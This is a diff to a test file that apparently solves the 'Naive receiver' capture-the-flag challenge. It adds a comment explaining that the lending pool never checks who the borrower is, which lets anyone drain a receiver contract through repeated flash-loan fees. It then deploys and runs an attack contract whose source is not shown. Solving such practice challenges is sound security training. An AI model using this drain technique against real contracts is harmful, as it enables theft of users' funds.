@@ -31,6 +31,15 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        /**
+         * @notice whats wrong with the smart contract is the LenderPool never validate that the borrower is msg.sender or not 
+         * so literally anyone can move 1 ETH(which is FIXED_FEE from Lender) from any contract thats contain "receiveEther(uint256)"
+         * to this LenderPool, look like a malicious contract right. we can make a contract to execute "flashloan()" in several times for drain up 
+         * the receiver balance 
+         */
+        const AttackFactory = await ethers.getContractFactory("NaiveReceiverAttack",attacker);
+        this.attackContract = await AttackFactory.deploy(this.receiver.address, this.pool.address);
+        await this.attackContract.attack();
     });
 
     after(async function () {
